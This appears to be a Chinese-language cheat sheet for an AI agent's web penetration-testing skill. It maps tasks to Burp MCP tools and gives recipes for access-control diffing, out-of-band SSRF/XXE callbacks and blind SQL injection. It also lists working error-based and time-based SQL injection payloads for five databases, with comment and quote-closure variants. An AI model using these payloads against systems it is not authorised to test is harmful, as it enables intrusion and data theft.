# Burp MCP 工具速查

> pentest/web-vuln-hunting 按需 Read 本文件。Burp MCP 连接失败时退化为 curl。

## 工具映射

| 需求 | 工具 | 备注 |
|------|------|------|
| 获取历史请求 | `proxy_history` | `max_results≤10`, `include_response: false` |
| 获取站点地图 | `sitemap_query` | 补充URL发现 |
| 发送测试请求 | `http_send_request` | **仅在Burp MCP模式下用，pentest默认禁止** |
| 并行发送 | `http_send_requests_parallel` | 批量对比用 |
| 解析响应 | `analyze_response` | 提取报错/特征 |
| 差异比较 | `http_analyze_variations` | 布尔盲注真/假差分 |
| 参数提取 | `analyze_extract_params` | URL/Body/Header/Cookie全量 |
| XSS反射检测 | `analyze_find_reflected` | 检查反射点 |
| 越权对比 | `auth_diff` | 多认证上下文自动对比 |
| 敏感信息 | `passive_intel` | 密钥/IP/连接串 |
| 带外交互 | `collaborator_create_client` + `collaborator_poll` | SSRF/XXE/盲注外带 |
| 请求耗时 | `http_send_request` → `duration` 字段 | 时间盲注 |
| 主动扫描 | `scanner_start_audit` + `scanner_task_status` + `scanner_issues` | Burp主动扫描兜底 |
| 编解码 | `util_url_encode` / `util_base64_decode` | — |
| 发到Repeater | `repeater_send_to_repeater` | 确认漏洞后标记 |

## 常用组合

### 越权测试（auth_diff）
```
auth_diff({
  base_request: { url, method, headers_A, body },
  auth_contexts: [
    { name: "admin", headers: { Cookie: "..." } },
    { name: "user",  headers: { Cookie: "..." } },
    { name: "noauth", headers: {} }
  ]
})
```
相同敏感数据 → 越权；不同数据 → 正常。

### 带外检测（Collaborator）
```
1. collaborator_create_client() → domain
2. http_send_request({ url: "target?param=http://{domain}" })
3. collaborator_poll({ client_id }) → DNS/HTTP交互记录
```

### 布尔盲注差分
```
1. http_send_request(payload_true)  → resp_true
2. http_send_request(payload_false) → resp_false
3. http_analyze_variations({ responses: [resp_true, resp_false] })
   差异 > 5% → 盲注确认
```
## 多数据库SQLi报错Payload速查

> 技术栈已知 → 直接用对应数据库；未知 → 按 MySQL→PG→MSSQL→Oracle→SQLite 顺序盲测。

| 数据库 | Payload | 命中关键词 |
|--------|---------|-----------|
| MySQL | `' AND updatexml(1,concat(0x7e,version()),1)-- ` | `XPATH syntax error` |
| MySQL | `' AND extractvalue(1,concat(0x7e,version()))-- ` | `XPATH syntax error` |
| PostgreSQL | `' AND 1=CAST(version() AS INT)-- ` | `invalid input syntax for integer` |
| MSSQL | `' AND 1=CONVERT(int, @@version)-- ` | `Conversion failed when converting` |
| Oracle | `' AND 1=CTXSYS.DRITHSX.SN(1,2)-- ` | `ORA-20000` |
| SQLite | `' AND 1=load_extension(1)-- ` | `SQLITE_ERROR` |

注释符变体（全测）：`-- `、`--+`、`%23`（#）、`/* */`

闭合方式变体：`'`、`"`、`')`、`'))`、无闭合（数字型）

时间盲注延时函数：
- MySQL: `SLEEP(5)` | PG: `pg_sleep(5)` | MSSQL: `WAITFOR DELAY '0:0:5'` | Oracle: `DBMS_LOCK.SLEEP(5)`
- 判定：`duration > 5000ms`
